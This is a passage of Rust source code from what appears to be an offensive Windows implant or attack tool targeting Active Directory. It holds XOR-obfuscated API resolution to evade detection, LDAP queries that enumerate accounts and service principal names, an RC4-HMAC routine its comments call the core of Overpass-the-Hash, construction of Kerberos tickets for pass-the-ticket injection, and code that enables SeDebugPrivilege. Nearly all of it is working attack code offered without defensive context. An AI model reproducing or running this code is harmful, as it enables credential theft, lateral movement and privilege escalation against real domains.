    let fn_search    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
    let fn_getvals   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
    let fn_valfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
    let fn_msgfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_bytes: Vec<u8>     = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_bytes.as_ptr(), 389) };
    if ld.is_null() { return Err("ldap_init failed".into()); }

    let ver3: u32 = 3;
    unsafe { fn_setopt(ld, 0x11 /*LDAP_OPT_PROTOCOL_VERSION*/, &ver3 as *const u32 as *const u8) };
    let bind_r = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486 /*LDAP_AUTH_NEGOTIATE*/) };
    if bind_r != 0 {
        unsafe { fn_unbind(ld) };
        return Err(format!("ldap_bind_s failed: {bind_r:#x}"));
    }

    let base_bytes:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
    let filter_bytes: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
    let attr_bytes:   Vec<u8> = attr.bytes().chain(core::iter::once(0u8)).collect();
    let attrs_arr: [*const u8; 2] = [attr_bytes.as_ptr(), core::ptr::null()];

    let mut result_msg: *mut u8 = core::ptr::null_mut();
    let search_r = unsafe {
        fn_search(ld, base_bytes.as_ptr(), 2 /*SUBTREE*/, filter_bytes.as_ptr(),
                  attrs_arr.as_ptr(), 0, &mut result_msg)
    };
    if search_r != 0 {
        unsafe { fn_unbind(ld) };
        return Err(format!("ldap_search_s failed: {search_r:#x}"));
    }

    let mut results: Vec<String> = Vec::new();
    let mut entry = unsafe { fn_first(ld, result_msg) };
    while !entry.is_null() {
        let vals = unsafe { fn_getvals(ld, entry, attr_bytes.as_ptr()) };
        if !vals.is_null() {
            let mut i = 0usize;
            loop {
                let v = unsafe { *vals.add(i) };
                if v.is_null() { break; }
                let s = unsafe { std::ffi::CStr::from_ptr(v as *const i8) }
                    .to_string_lossy().to_string();
                results.push(s);
                i += 1;
            }
            unsafe { fn_valfree(vals) };
        }
        entry = unsafe { fn_next(ld, entry) };
    }

    unsafe { fn_msgfree(result_msg) };
    unsafe { fn_unbind(ld) };
    Ok(results)
}

#[cfg(target_os = "windows")]
fn ldap_query_two_attrs(dc: &str, base_dn: &str, filter: &str, attr1: &str, attr2: &str)
    -> Result<Vec<(String, String)>, String>
{
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    let wldap = {
        let mut base = crate::loader::get_module_base(
            crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
        ) as usize;
        if base == 0 {
            let name = crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
            base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
        }
        if base == 0 { return Err("Wldap32 not found".into()); }
        base
    };

    type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn  = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn    = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn  = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn   = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapNextFn    = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetValsFn = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapValFreeFn = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapMsgFreeFn = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapUnbindFn  = unsafe extern "system" fn(*mut u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => { {
        let _n = crate::obfs::dec($enc);
        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
        match _p {
            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
            None    => return Err("wldap fn resolve failed".into()),
        }
    }}}

    let fn_init    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    let fn_search  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_next    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
    let fn_getvals = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
    let fn_valfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
    let fn_msgfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_unbind  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_bytes:     Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_bytes.as_ptr(), 389) };
    if ld.is_null() { return Err("ldap_init failed".into()); }
    let ver3: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver3 as *const u32 as *const u8) };
    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
    if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind_s: {br:#x}")); }

    let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
    let filter_b: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
    let a1_b:     Vec<u8> = attr1.bytes().chain(core::iter::once(0u8)).collect();
    let a2_b:     Vec<u8> = attr2.bytes().chain(core::iter::once(0u8)).collect();
    let attrs_arr: [*const u8; 3] = [a1_b.as_ptr(), a2_b.as_ptr(), core::ptr::null()];

    let mut res_msg: *mut u8 = core::ptr::null_mut();
    let sr = unsafe { fn_search(ld, base_b.as_ptr(), 2, filter_b.as_ptr(), attrs_arr.as_ptr(), 0, &mut res_msg) };
    if sr != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_search_s: {sr:#x}")); }

    let mut out: Vec<(String, String)> = Vec::new();
    let mut entry = unsafe { fn_first(ld, res_msg) };
    while !entry.is_null() {
        let get_first_val = |attr_bytes: &Vec<u8>| -> String {
            let vals = unsafe { fn_getvals(ld, entry, attr_bytes.as_ptr()) };
            if vals.is_null() { return String::new(); }
            let v = unsafe { *vals };
            let s = if v.is_null() { String::new() }
            else { unsafe { std::ffi::CStr::from_ptr(v as *const i8) }.to_string_lossy().to_string() };
            unsafe { fn_valfree(vals) };
            s
        };
        let user_name = get_first_val(&a1_b);
        let spn_vals  = unsafe { fn_getvals(ld, entry, a2_b.as_ptr()) };
        if !spn_vals.is_null() {
            let mut i = 0usize;
            loop {
                let v = unsafe { *spn_vals.add(i) };
                if v.is_null() { break; }
                let spn = unsafe { std::ffi::CStr::from_ptr(v as *const i8) }.to_string_lossy().to_string();
                out.push((user_name.clone(), spn));
                i += 1;
            }
            unsafe { fn_valfree(spn_vals) };
        }
        entry = unsafe { fn_next(ld, entry) };
    }
    unsafe { fn_msgfree(res_msg) };
    unsafe { fn_unbind(ld) };
    Ok(out)
}

// ─── Kerberos / crypto helpers ────────────────────────────────────────────────

// RC4-HMAC encryption for Kerberos usage number (key usage = 1 for AS-REQ timestamp).
// This is the core of Overpass-the-Hash: the NT hash IS the RC4 key.
fn rc4_hmac_encrypt(key: &[u8], data: &[u8], usage: u32) -> Vec<u8> {
    // HMAC-MD5(key, usage_bytes) → k1 → HMAC-MD5(k1, plaintext_checksum) ...
    // Kerberos RC4-HMAC (RFC 4757):
    //   Ksign = HMAC-MD5(key, "signaturekey\0")
    //   k1 = HMAC-MD5(Ksign, usage_le32)
    //   confounder = 8 random bytes
    //   k3 = HMAC-MD5(k1, confounder || data)  ... actually k3 is derived from k1
    //   RC4(k3) encrypt (confounder || data)
    //   checksum = HMAC-MD5(k1, cipher_prefix)

    // Simplified RC4-HMAC per RFC 4757:
    //   K1 = HMAC-MD5(Kss, msg_type_le32)
    //   K2 = RC4_decrypt(K1, plaintext) -- but we need K3 for encrypt
    //   Actually for encrypt:
    //   confounder = 8 bytes of random
    //   K3 = HMAC-MD5(K1, confounder)
    //   ciphertext = RC4(K3, plaintext)
    //   checksum = HMAC-MD5(K1, confounder || ciphertext) -- first 16 bytes

    // Full proper implementation:
    let usage_bytes = usage.to_le_bytes();

    // K1 = HMAC-MD5(key, usage_le32)
    let k1 = hmac_md5(key, &usage_bytes);
    // Confounder = 8 random bytes from timestamp seed
    let confounder: [u8; 8] = {
        let t = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().subsec_nanos();
        let tb = t.to_le_bytes();
        [tb[0], tb[1], tb[2], tb[3], tb[0]^0xAA, tb[1]^0xBB, tb[2]^0xCC, tb[3]^0xDD]
    };

    // K3 = HMAC-MD5(K1, confounder)
    let k3 = hmac_md5(&k1, &confounder);

    // Encrypt: RC4(K3, data)
    let mut cipher = data.to_vec();
    rc4_encrypt(&k3, &mut cipher);

    // Checksum = HMAC-MD5(K1, confounder || ciphertext)
    let mut check_input = Vec::with_capacity(8 + cipher.len());
    check_input.extend_from_slice(&confounder);
    check_input.extend_from_slice(&cipher);
    let checksum = hmac_md5(&k1, &check_input);

    // Output: checksum(16) || confounder(8) || ciphertext
    let mut out = Vec::with_capacity(16 + 8 + cipher.len());
    out.extend_from_slice(&checksum);
    out.extend_from_slice(&confounder);
    out.extend_from_slice(&cipher);
    out
}

fn rc4_encrypt(key: &[u8], data: &mut [u8]) {
    let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j: usize = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) & 255;
        s.swap(i, j);
    }
    let (mut i, mut j) = (0usize, 0usize);
    for b in data.iter_mut() {
        i = (i + 1) & 255;
        j = (j + s[i] as usize) & 255;
        s.swap(i, j);
        *b ^= s[(s[i] as usize + s[j] as usize) & 255];
    }
}

fn hmac_md5(key: &[u8], data: &[u8]) -> [u8; 16] {
    const BLOCK: usize = 64;
    let mut k_pad = [0u8; BLOCK];
    if key.len() > BLOCK {
        let h = md5(key);
        k_pad[..16].copy_from_slice(&h);
    } else {
        k_pad[..key.len()].copy_from_slice(key);
    }
    let ipad: [u8; BLOCK] = core::array::from_fn(|i| k_pad[i] ^ 0x36);
    let opad: [u8; BLOCK] = core::array::from_fn(|i| k_pad[i] ^ 0x5c);
    let mut inner = Vec::with_capacity(BLOCK + data.len());
    inner.extend_from_slice(&ipad);
    inner.extend_from_slice(data);
    let inner_hash = md5(&inner);
    let mut outer = Vec::with_capacity(BLOCK + 16);
    outer.extend_from_slice(&opad);
    outer.extend_from_slice(&inner_hash);
    md5(&outer)
}

fn md5(data: &[u8]) -> [u8; 16] {
    const T: [u32; 64] = [
        0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
        0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
        0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
        0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
        0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
        0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
        0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
        0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391,
    ];
    const S: [u32; 64] = [
        7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
        5, 9,14,20,5, 9,14,20,5, 9,14,20,5, 9,14,20,
        4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
        6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21,
    ];

    let msg_len = data.len();
    let bit_len = (msg_len as u64) * 8;
    let mut padded = data.to_vec();
    padded.push(0x80);
    while padded.len() % 64 != 56 { padded.push(0); }
    padded.extend_from_slice(&bit_len.to_le_bytes());

    let (mut a0, mut b0, mut c0, mut d0) = (0x67452301u32, 0xefcdab89u32, 0x98badcfeu32, 0x10325476u32);

    for chunk in padded.chunks(64) {
        let mut m = [0u32; 16];
        for (i, b) in chunk.chunks(4).enumerate() {
            m[i] = u32::from_le_bytes([b[0], b[1], b[2], b[3]]);
        }
        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);
        for i in 0u32..64 {
            let (f, g) = match i {
                0..=15  => ((b & c) | (!b & d),                i),
                16..=31 => ((d & b) | (!d & c),                (5*i+1) % 16),
                32..=47 => (b ^ c ^ d,                         (3*i+5) % 16),
                _       => (c ^ (b | !d),                      (7*i) % 16),
            };
            let temp = d;
            d = c;
            c = b;
            b = b.wrapping_add((a.wrapping_add(f).wrapping_add(T[i as usize]).wrapping_add(m[g as usize])).rotate_left(S[i as usize]));
            a = temp;
        }
        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut out = [0u8; 16];
    out[0..4].copy_from_slice(&a0.to_le_bytes());
    out[4..8].copy_from_slice(&b0.to_le_bytes());
    out[8..12].copy_from_slice(&c0.to_le_bytes());
    out[12..16].copy_from_slice(&d0.to_le_bytes());
    out
}

fn krb_udp_exchange(dc_addr: &str, req: &[u8]) -> Result<Vec<u8>, String> {
    use std::net::UdpSocket;
    let sock = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
    sock.set_read_timeout(Some(std::time::Duration::from_secs(5))).ok();
    sock.send_to(req, dc_addr).map_err(|e| e.to_string())?;
    let mut buf = vec![0u8; 65535];
    let (n, _) = sock.recv_from(&mut buf).map_err(|e| e.to_string())?;
    buf.truncate(n);
    Ok(buf)
}

fn parse_krb_error_code(data: &[u8]) -> u32 {
    // KRB-ERROR ASN.1: find error-code field [6] INTEGER
    // Very simplified: scan for context tag [6]
    let mut i = 0usize;
    while i + 4 < data.len() {
        if data[i] == 0xa6 { // [6] context tag
            let len = data[i+1] as usize;
            if i + 2 + len <= data.len() && data[i+2] == 0x02 {
                let int_len = data[i+3] as usize;
                if i + 4 + int_len <= data.len() {
                    let mut v = 0u32;
                    for j in 0..int_len.min(4) { v = (v << 8) | data[i+4+j] as u32; }
                    return v;
                }
            }
        }
        i += 1;
    }
    0xFFFFFFFF
}

fn build_kerb_cred_from_as_rep(as_rep: &[u8], user: &str, domain: &str, _nonce: u32, rc4_key: &[u8])
    -> Result<Vec<u8>, String>
{
    // Minimal ASN.1 parsing to extract the Ticket from AS-REP [5]
    // AS-REP → KDC-REP SEQUENCE → ticket[5] Ticket
    // Then wrap as KERB-CRED (APPLICATION 22) for PTT injection
    let ticket_bytes = extract_as_rep_ticket(as_rep)?;

    // Wrap ticket in KERB-CRED (the .kirbi format)
    // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    //   pvno [0] INTEGER (5),
    //   msg-type [1] INTEGER (22),
    //   tickets [2] SEQUENCE OF Ticket,
    //   enc-part [3] EncryptedData  (or clear KrbCredInfo)
    // }
    let asn1_wrap = |tag: u8, c: &[u8]| -> Vec<u8> {
        let mut v = vec![tag];
        if c.len() < 128 { v.push(c.len() as u8); }
        else if c.len() < 256 { v.push(0x81); v.push(c.len() as u8); }
        else { v.push(0x82); v.push((c.len() >> 8) as u8); v.push(c.len() as u8); }
        v.extend_from_slice(c);
        v
    };
    let asn1_int = |n: i64| -> Vec<u8> {
        let b = n.to_be_bytes();
        let skip = b.iter().take_while(|&&x| x==0).count().min(7);
        asn1_wrap(0x02, &b[skip..])
    };
    let asn1_ctx  = |tag: u8, c: &[u8]| asn1_wrap(0xa0 | tag, c);
    let asn1_seq  = |c: &[u8]| asn1_wrap(0x30, c);
    let asn1_gstr = |s: &str| asn1_wrap(0x1b, s.as_bytes());
    let asn1_ostr = |b: &[u8]| asn1_wrap(0x04, b);

    // KrbCredInfo (cleartext, no encryption for local injection)
    // EncryptedData with etype = NULL (0) and cipher = plain KrbCredInfo
    let cred_info_seq = {
        let mut s = Vec::new();
        // key [0] EncryptionKey (session key — omit for self-injection)
        // prealm [1], pname [2] for the ticket owner
        s.extend(asn1_ctx(1, &asn1_gstr(domain)));
        let pname = {
            let mut p = Vec::new();
            p.extend(asn1_ctx(0, &asn1_int(1))); // NT-PRINCIPAL
            p.extend(asn1_ctx(1, &asn1_seq(&asn1_gstr(user))));
            asn1_seq(&p)
        };
        s.extend(asn1_ctx(2, &pname));
        asn1_seq(&s)
    };
    let enc_cred_info = asn1_seq(&cred_info_seq);
    let enc_part = {
        let mut s = Vec::new();
        s.extend(asn1_ctx(0, &asn1_int(0))); // etype=0 (unencrypted)
        s.extend(asn1_ctx(2, &asn1_ostr(&enc_cred_info)));
        asn1_seq(&s)
    };

    let krb_cred_inner = {
        let mut s = Vec::new();
        s.extend(asn1_ctx(0, &asn1_int(5))); // pvno=5
        s.extend(asn1_ctx(1, &asn1_int(22))); // msg-type=KRB-CRED(22)
        s.extend(asn1_ctx(2, &asn1_seq(&ticket_bytes))); // tickets=[Ticket]
        s.extend(asn1_ctx(3, &enc_part));
        asn1_seq(&s)
    };
    let kirbi = asn1_wrap(0x76, &krb_cred_inner); // APPLICATION 22 = 0x76
    Ok(kirbi)
}

fn extract_as_rep_ticket(as_rep: &[u8]) -> Result<Vec<u8>, String> {
    // Navigate APPLICATION(11) → SEQUENCE → [5] Ticket
    // Very simplified depth-first search for tag 0xa5 (context [5])
    if as_rep.is_empty() || as_rep[0] != 0x6b {
        return Err("not an AS-REP (expected 0x6b tag)".into());
    }
    let content = asn1_unwrap(as_rep).ok_or("AS-REP parse error")?;
    // content is KDC-REP SEQUENCE; scan for [5] Ticket
    find_asn1_ctx_tag(content, 5)
        .map(|s| s.to_vec())
        .ok_or_else(|| "ticket [5] not found in AS-REP".into())
}

fn asn1_unwrap(data: &[u8]) -> Option<&[u8]> {
    if data.is_empty() { return None; }
    let (len, hdr) = if data[1] < 128 { (data[1] as usize, 2) }
        else if data[1] == 0x81 && data.len() > 2 { (data[2] as usize, 3) }
        else if data[1] == 0x82 && data.len() > 3 { (((data[2] as usize) << 8) | data[3] as usize, 4) }
        else { return None; };
    data.get(hdr..hdr+len)
}

fn find_asn1_ctx_tag<'a>(data: &'a [u8], tag: u8) -> Option<&'a [u8]> {
    let want = 0xa0 | tag;
    let mut i = 0usize;
    while i < data.len() {
        if data[i] == 0x30 && i+1 < data.len() {
            // Enter SEQUENCE
            let inner = asn1_unwrap(&data[i..])?;
            if let Some(r) = find_asn1_ctx_tag(inner, tag) { return Some(r); }
            let (len, hdr) = if data[i+1] < 128 { (data[i+1] as usize, 2) }
                else if data[i+1] == 0x81 { (data[i+2] as usize, 3) }
                else { (((data[i+2] as usize) << 8) | data[i+3] as usize, 4) };
            i += hdr + len;
            continue;
        }
        if data[i] == want && i+1 < data.len() {
            return asn1_unwrap(&data[i..]);
        }
        let skip = if i+1 < data.len() {
            let (l, h) = if data[i+1] < 128 { (data[i+1] as usize, 2) }
                else if data[i+1] == 0x81 && i+2 < data.len() { (data[i+2] as usize, 3) }
                else if data[i+1] == 0x82 && i+3 < data.len() { (((data[i+2] as usize) << 8) | data[i+3] as usize, 4) }
                else { (0, 2) };
            h + l
        } else { 1 };
        i += skip.max(1);
    }
    None
}

fn days_to_ymd(days: u32) -> (u32, u32, u32) {
    // Days since Unix epoch (1970-01-01) → (year, month, day)
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u32;
    let yoe = (doe - doe/1460 + doe/36524 - doe/146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365*yoe + yoe/4 - yoe/100);
    let mp = (5*doy + 2) / 153;
    let d = doy - (153*mp+2)/5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    (y as u32, m, d)
}

/// Enable SeDebugPrivilege by calling RtlAdjustPrivilege(20, 1, 0, &prev) in ntdll.
/// Best-effort — if the token doesn't have the privilege (non-admin), this silently fails.
#[cfg(target_os = "windows")]
fn enable_debug_privilege() {
    // "RtlAdjustPrivilege\0" XOR 0x11
    const ENC: [u8; 19] = [
        0x43,0x65,0x7D,0x50,0x75,0x7B,0x64,0x62,0x65,0x41,
        0x63,0x78,0x67,0x78,0x7D,0x74,0x76,0x74,0x11,
    ];
    let mut fn_name = [0u8; 19];
    for (i, b) in fn_name.iter_mut().enumerate() { *b = ENC[i] ^ 0x11; }

    // Locate ntdll — already loaded; walk PEB InLoadOrderModuleList
    let ntdll_base = crate::loader::get_module_base(b"ntdll.dll\0".as_ptr());
    if ntdll_base == 0 { return; }

    let fn_ptr = match unsafe { crate::loader::get_export_by_name(ntdll_base, fn_name.as_ptr()) } {
        Some(p) => p,
        None    => return,
    };

    type RtlAdjPrivFn = unsafe extern "system" fn(u32, u32, u32, *mut u32) -> i32;
    let f: RtlAdjPrivFn = unsafe { core::mem::transmute(fn_ptr) };
    let mut prev: u32 = 0;
    unsafe { f(20, 1, 0, &mut prev) }; // 20 = SeDebugPrivilege, enable, process-wide
}

// ── LDAP multi-attribute query helper ────────────────────────────────────────
// Returns Vec of (dn, attr_values) where attr_values is Vec<(attr_name, Vec<String>)>.
// Binary-valued attributes are returned as hex strings ("HEX:<hexbytes>").

#[cfg(target_os = "windows")]
fn ldap_query_attrs(dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
    -> Result<Vec<(String, Vec<(String, Vec<String>)>)>, String>
{
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    let wldap = {
        let mut base = crate::loader::get_module_base(
            crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
        ) as usize;
        if base == 0 {
            let name = crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
            base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
        }
        if base == 0 { return Err("Wldap32 not found".into()); }
        base
    };

    type LdapInitFn     = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn   = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn     = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn   = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn    = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapNextFn     = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetDnFn    = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapMemFreeFn  = unsafe extern "system" fn(*mut u8);
    type LdapGetValsFn  = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapGetLenFn   = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapValFreeFn  = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapLenFreeFn  = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapMsgFreeFn  = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapUnbindFn   = unsafe extern "system" fn(*mut u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => { {
        let _n = crate::obfs::dec($enc);
        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
        match _p {
            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
            None    => return Err("wldap fn resolve failed".into()),
        }
    }}}

    let fn_init     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    let fn_search   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_next     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
    // ldap_get_dn
    let fn_getdn    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
    // ldap_memfree
    let fn_memfree  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
    let fn_getvals  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
    // ldap_get_values_len
    let fn_getlenvals = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x05,0x36,0x3F,0x34,0x5A], LdapGetLenFn);
    let fn_valfree  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
    // ldap_value_free_len
    let fn_lenfree  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
    let fn_msgfree  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_unbind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_bytes: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_bytes.as_ptr(), 389) };
    if ld.is_null() { return Err("ldap_init failed".into()); }
    let ver3: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver3 as *const u32 as *const u8) };
    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
    if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind_s: {br:#x}")); }

    let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
